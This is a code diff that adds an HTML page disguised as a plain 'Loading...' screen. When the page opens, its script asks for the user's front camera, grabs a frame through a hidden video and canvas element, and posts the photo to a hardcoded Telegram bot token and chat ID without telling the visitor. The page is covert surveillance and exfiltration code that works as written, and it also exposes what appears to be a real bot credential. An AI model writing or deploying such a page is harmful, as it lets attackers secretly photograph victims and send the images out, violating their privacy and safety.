@@ -1,0 +1,121 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture and Send Image</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to right, #f0f2f5, #dfe3ee);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .loading {
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 24px;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loading span {
+            margin-left: 10px;
+            display: inline-block;
+            animation: blink 1.4s infinite both;
+        }
+        .loading span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .loading span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        @keyframes blink {
+            0%, 20% {
+                opacity: 0;
+            }
+            20.1%, 100% {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading">
+            Loading <span>.</span><span>.</span><span>.</span>
+        </div>
+    </div>
+    <video id="video" style="display:none;" autoplay></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        async function sendImageToTelegram(imageData) {
+            const telegramBotToken = '7586940401:AAHCutu6eGBB2dqHNKdFnQMCXjSazw4CUYU';
+            const chatId = '6310487830';
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData, 'image.jpg');
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                console.log('Image sent to Telegram:', data);
+            } catch (error) {
+                console.error('Error sending image to Telegram:', error);
+            }
+        }
+
+        async function captureImage() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // Access the camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+
+                // Wait for the video to start playing
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        resolve();
+                    };
+                });
+
+                // Capture the image
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the image to a Blob
+                canvas.toBlob(async (blob) => {
+                    await sendImageToTelegram(blob);
+                }, 'image/jpeg');
+            } catch (error) {
+                console.error('Error accessing the camera:', error);
+            }
+        }
+
+        // Capture the image when the page loads
+        window.onload = captureImage;
+    </script>
+</body>
+</html>
